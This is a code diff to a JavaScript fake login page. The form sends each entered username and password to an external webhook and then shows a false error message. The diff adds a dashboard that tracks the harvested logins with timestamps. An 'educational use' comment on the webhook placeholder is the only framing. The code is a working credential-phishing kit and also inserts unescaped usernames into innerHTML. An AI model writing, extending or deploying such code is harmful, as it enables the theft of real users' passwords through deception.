@@ -109,8 +109,14 @@ document.addEventListener("DOMContentLoaded", function() {
   const loginBtn = document.getElementById("loginBtn");
   const errorMsg = document.getElementById("errorMsg");
   const loginForm = document.getElementById("loginForm");
+  const loginList = document.getElementById("loginList");
+  const totalLogins = document.getElementById("totalLogins");
+  const lastLogin = document.getElementById("lastLogin");
 
-  const WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"; // Replace with your actual webhook
+  const WEBHOOK_URL = "YOUR_TEST_WEBHOOK_URL"; // Replace with your test webhook URL for educational use
+
+  let loginCount = 0;
+  let capturedLogins = [];
 
   function checkInputs() {
     if (usernameInput.value.trim() && passwordInput.value.trim()) {
@@ -124,24 +130,65 @@ document.addEventListener("DOMContentLoaded", function() {
     }
   }
 
+  function updateAdminDashboard(username, timestamp) {
+    loginCount++;
+    capturedLogins.push({ username, timestamp });
+    totalLogins.textContent = loginCount;
+    lastLogin.textContent = timestamp;
+
+    const loginItem = document.createElement("div");
+    loginItem.className = "highlight mb-2 p-2 flex justify-between items-center";
+    loginItem.innerHTML = `
+      <span>${username} - ${timestamp}</span>
+      <span class="remove-btn" onclick="removeLogin(this, '${username}', '${timestamp}')">
+        <i class="fas fa-trash-alt"></i>
+      </span>
+    `;
+    loginList.appendChild(loginItem);
+  }
+
+  window.removeLogin = function(element, username, timestamp) {
+    capturedLogins = capturedLogins.filter(
+      (login) => login.username !== username || login.timestamp !== timestamp
+    );
+    loginCount--;
+    totalLogins.textContent = loginCount;
+    if (capturedLogins.length > 0) {
+      lastLogin.textContent = capturedLogins[capturedLogins.length - 1].timestamp;
+    } else {
+      lastLogin.textContent = "N/A";
+    }
+    element.parentElement.remove();
+  };
+
   usernameInput.addEventListener("input", checkInputs);
   passwordInput.addEventListener("input", checkInputs);
 
   loginForm.addEventListener("submit", function(e) {
     e.preventDefault();
-    errorMsg.classList.remove("hidden");
-    passwordInput.value = "";
-    checkInputs();
-
-    // Send data to webhook
     const username = usernameInput.value.trim();
     const password = passwordInput.value.trim();
-    if(username && password) {
+    const timestamp = new Date().toLocaleString();
+
+    if (username && password) {
+      // Send data to webhook
       fetch(WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ username, password })
-      }).catch(console.error);
+        body: JSON.stringify({ username, password, timestamp })
+      })
+        .then(() => {
+          updateAdminDashboard(username, timestamp);
+          errorMsg.classList.remove("hidden");
+          usernameInput.value = "";
+          passwordInput.value = "";
+          checkInputs();
+        })
+        .catch((error) => {
+          console.error("Error sending to webhook:", error);
+          errorMsg.textContent = "Error submitting data. Try again.";
+          errorMsg.classList.remove("hidden");
+        });
     }
   });
 
